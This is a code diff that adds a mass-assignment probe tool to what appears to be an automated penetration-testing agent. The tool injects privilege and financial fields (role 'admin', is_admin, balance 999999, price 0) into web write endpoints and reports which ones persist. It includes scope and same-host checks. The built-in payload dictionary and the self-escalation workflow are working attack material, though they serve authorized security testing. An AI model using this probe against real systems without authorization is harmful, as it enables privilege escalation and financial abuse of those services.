@@ -10399,6 +10399,174 @@ def _execute_response_diff(args: Dict[str, Any], target: Target, emit: Any) -> D
     return result
 
 
+# Privilege/sensitive fields a write endpoint usually should NOT let the client
+# set, mapped to an attacker-favourable value to inject. If any of these come
+# BACK on a read of the object, the endpoint mass-assigns them (BOLA/privesc).
+_MASS_ASSIGN_PROBES: Dict[str, Any] = {
+    "role": "admin", "roles": "admin", "is_admin": True, "isAdmin": True, "admin": True,
+    "is_staff": True, "is_superuser": True, "superuser": True, "is_root": True,
+    "user_type": "admin", "account_type": "admin", "accountType": "admin", "type": "admin",
+    "group": "admin", "groups": "admin", "level": 99, "access_level": 99,
+    "balance": 999999, "credit": 999999, "credits": 999999, "wallet_balance": 999999, "points": 999999,
+    "is_verified": True, "verified": True, "email_verified": True, "kyc_verified": True, "kyc": "verified",
+    "is_active": True, "active": True, "enabled": True, "approved": True, "status": "active",
+    "plan": "enterprise", "tier": "premium", "subscription": "premium", "premium": True,
+    "permissions": "admin", "permission": "admin", "scope": "admin", "scopes": "admin",
+    "privilege": "admin", "privileges": "admin", "can_admin": True, "owner": True,
+    "discount": 100, "price": 0, "amount_due": 0,
+}
+
+
+def _ma_truthy(v: Any) -> bool:
+    if isinstance(v, bool):
+        return v
+    return str(v).strip().lower() in ("1", "true", "yes", "on", "admin", "active", "premium", "enterprise", "verified")
+
+
+def _ma_val_eq(a: Any, b: Any) -> bool:
+    """Tolerant equality: True == 1 == 'true', 999999 == '999999', 'admin' == 'ADMIN'."""
+    if isinstance(a, bool) or isinstance(b, bool):
+        return _ma_truthy(a) == _ma_truthy(b)
+    return str(a).strip().lower() == str(b).strip().lower()
+
+
+def _ma_json(resp: Any) -> Optional[Dict[str, Any]]:
+    if not isinstance(resp, dict):
+        return None
+    body = resp.get("body_preview") or resp.get("body") or ""
+    try:
+        obj = json.loads(body)
+        return obj if isinstance(obj, dict) else None
+    except Exception:
+        return None
+
+
+def _execute_mass_assign_probe(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
+    """
+    Tests a write endpoint for MASS ASSIGNMENT / auto-binding (a top-paying,
+    highly-automatable BOLA/privesc class): does it blindly persist
+    attacker-supplied privilege/sensitive fields (role, is_admin, balance,
+    is_verified, plan, ...) that the client should never control?
+
+    How it works: read the object (verify_url) BEFORE, send a write (url) that
+    includes the caller's legitimate `base` fields PLUS a batch of privilege
+    probe fields set to attacker-favourable values, then read the object AGAIN
+    and report exactly which probe fields PERSISTED (came back changed to the
+    injected value). Persistence — not just an HTTP 200 — is the proof: an
+    endpoint that silently drops unknown fields returns 200 too.
+
+    Runs under whatever session is active (capture_identity/swap_session) or a
+    named `identity`, so you can prove a LOW-privilege user escalated
+    themselves. Both URLs must be the same host; each is scope-checked here.
+    Advisory — confirm the escalation's effect, then verify_finding +
+    record_finding. It never records anything itself.
+    """
+    url = (args.get("url") or "").strip()
+    if not url:
+        return {"error": "mass_assign_probe needs 'url' — the write endpoint (e.g. POST/PUT /api/profile)."}
+    method = str(args.get("method") or "POST").upper()
+    if method not in ("POST", "PUT", "PATCH"):
+        return {"error": f"mass_assign_probe method must be POST/PUT/PATCH (got {method}) — mass assignment is a write."}
+    verify_url = (args.get("verify_url") or args.get("read_url") or "").strip() or url.split("?", 1)[0]
+    as_form = str(args.get("content") or "json").lower() == "form"
+    base = args.get("base") if isinstance(args.get("base"), dict) else {}
+    identity = args.get("identity")
+
+    # custom probe set, else the built-in privilege-field dictionary
+    custom = args.get("fields")
+    if isinstance(custom, dict) and custom:
+        probes = dict(custom)
+    elif isinstance(custom, list) and custom:
+        probes = {str(f): _MASS_ASSIGN_PROBES.get(str(f), True) for f in custom}
+    else:
+        probes = dict(_MASS_ASSIGN_PROBES)
+
+    # same-host + scope check for both URLs (defense in depth — the dispatcher
+    # only gates the top-level 'url').
+    w_host, _ = normalize_host(url if url.startswith(("http://", "https://")) else f"https://{url}")
+    r_host, _ = normalize_host(verify_url if verify_url.startswith(("http://", "https://")) else f"https://{verify_url}")
+    if w_host and r_host and w_host != r_host:
+        return {"error": f"write host ('{w_host}') and verify host ('{r_host}') differ — both must be the same host."}
+    if target and target.scope_rules and target.scope_rules.in_scope:
+        for u in (url, verify_url):
+            allowed, reason = is_in_scope(u, target.scope_rules)
+            if not allowed:
+                return {"error": f"SCOPE_VIOLATION: {reason}", "target": u, "blocked": True}
+
+    def _curl(u, meth, payload=None):
+        a = {"url": u, "method": meth, "isolate": bool(args.get("isolate"))}
+        if identity:
+            a["identity"] = identity
+        if payload is not None:
+            if as_form:
+                a["body"] = "&".join(f"{k}={v}" for k, v in payload.items())
+                a["headers"] = {"Content-Type": "application/x-www-form-urlencoded"}
+            else:
+                a["json"] = payload
+        return _execute_curl(a, target, emit)
+
+    # identity resolution reuses response_diff's per-side identity support in
+    # _execute_curl via the 'identity' arg, so no extra wiring needed here.
+    before = _curl(verify_url, "GET")
+    before_obj = _ma_json(before) or {}
+
+    injected = dict(base)
+    injected.update(probes)
+    write_resp = _curl(url, method, injected)
+    if isinstance(write_resp, dict) and write_resp.get("error"):
+        return {"error": f"the write request failed: {write_resp['error']}", "url": url}
+
+    after = _curl(verify_url, "GET")
+    after_obj = _ma_json(after)
+
+    write_status = write_resp.get("status_code") if isinstance(write_resp, dict) else None
+
+    if after_obj is None:
+        # No JSON object to confirm persistence against — report honestly.
+        return {
+            "status": "inconclusive",
+            "write_status_code": write_status,
+            "note": (
+                f"Sent {len(probes)} privilege probe fields to {method} {url}, but the verify read of "
+                f"{verify_url} didn't return a JSON object to confirm whether any persisted. Point verify_url "
+                f"at the endpoint that echoes this object's current state (often a GET on the same path), or "
+                f"check manually whether the injected role/is_admin/balance stuck."),
+            "injected_fields": sorted(probes.keys()),
+        }
+
+    persisted = []
+    for field, val in probes.items():
+        if field in after_obj and _ma_val_eq(after_obj.get(field), val) and not _ma_val_eq(before_obj.get(field), val):
+            persisted.append({"field": field, "injected": val, "now": after_obj.get(field),
+                              "was": before_obj.get(field, "<absent>")})
+
+    if persisted:
+        hot = [p["field"] for p in persisted]
+        summary = (f"MASS ASSIGNMENT confirmed — {method} {url} persisted attacker-supplied field(s): "
+                   f"{', '.join(hot)}. These came back on a read set to the injected value, i.e. the client "
+                   f"controlled fields it shouldn't. If any is a privilege field (role/is_admin/permissions) "
+                   f"this is vertical privilege escalation; a balance/credit/discount field is financial. "
+                   f"Confirm the escalated effect (e.g. now reach an admin-only endpoint), then verify_finding "
+                   f"+ record_finding(kind='mass_assignment').")
+        if emit and hasattr(emit, "warn"):
+            emit.warn(f"[mass_assign_probe] {summary}")
+    else:
+        summary = (f"No mass assignment detected — none of the {len(probes)} privilege probe fields persisted "
+                   f"on a read after {method} {url} (write returned HTTP {write_status}). The endpoint appears "
+                   f"to ignore/allowlist unknown fields. Not a finding.")
+
+    return {
+        "status": "vulnerable" if persisted else "not_vulnerable",
+        "method": method,
+        "url": url,
+        "verify_url": verify_url,
+        "write_status_code": write_status,
+        "persisted_fields": persisted,
+        "injected_field_count": len(probes),
+        "summary": summary,
+    }
+
+
 def _execute_verify_finding(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
     """
     Runs an INDEPENDENT, code-level signal check for a disputed or about-
@@ -12950,6 +13118,36 @@ TOOL_REGISTRY: Dict[str, ToolSpec] = {
             "required": []
         },
         executor=_execute_response_diff
+    ),
+    "mass_assign_probe": ToolSpec(
+        name="mass_assign_probe",
+        description=(
+            "Tests a WRITE endpoint for MASS ASSIGNMENT / auto-binding — a top-paying, highly-automatable "
+            "privilege-escalation/BOLA class: does it blindly persist attacker-supplied privilege/sensitive "
+            "fields (role, is_admin, balance, is_verified, plan, permissions, discount…) the client should "
+            "never control? It reads the object BEFORE, sends the write with your legit `base` fields PLUS a "
+            "batch of privilege probe fields set to attacker-favourable values, reads it AGAIN, and reports "
+            "exactly which fields PERSISTED (came back changed) — persistence is the proof, not a 200 (an "
+            "endpoint that silently drops unknown fields also returns 200). Run it as a LOW-privilege user "
+            "(active session, or a captured `identity`) to prove self-escalation. Perfect on signup-enabled "
+            "apps: register a throwaway account, then probe its profile/update endpoint. Advisory — confirm "
+            "the escalated effect (e.g. now reach an admin-only route), then verify_finding + record_finding."
+        ),
+        parameters={
+            "type": "object",
+            "properties": {
+                "url": {"type": "string", "description": "The write endpoint to probe (e.g. http://host/api/profile). Method is POST/PUT/PATCH."},
+                "method": {"type": "string", "description": "POST (default), PUT, or PATCH — the write verb the endpoint uses."},
+                "verify_url": {"type": "string", "description": "GET endpoint that echoes the object's current state, to confirm persistence. Defaults to url without its query string."},
+                "base": {"type": "object", "description": "Your legitimate fields so the write is accepted (e.g. {\"email\":\"me@x.com\"}). The probe fields are added on top."},
+                "fields": {"type": "array", "items": {"type": "string"}, "description": "Optional — only probe these field names instead of the full built-in privilege dictionary."},
+                "content": {"type": "string", "description": "'json' (default) or 'form' — how to encode the write body."},
+                "identity": {"type": "string", "description": "Optional captured identity (capture_identity) to send the write as — e.g. a freshly-registered low-priv account."},
+                "isolate": {"type": "boolean", "description": "Suppress the auto-attached active session on these requests (use when you pass identity or explicit auth)."},
+            },
+            "required": ["url"]
+        },
+        executor=_execute_mass_assign_probe
     ),
     "verify_finding": ToolSpec(
         name="verify_finding",
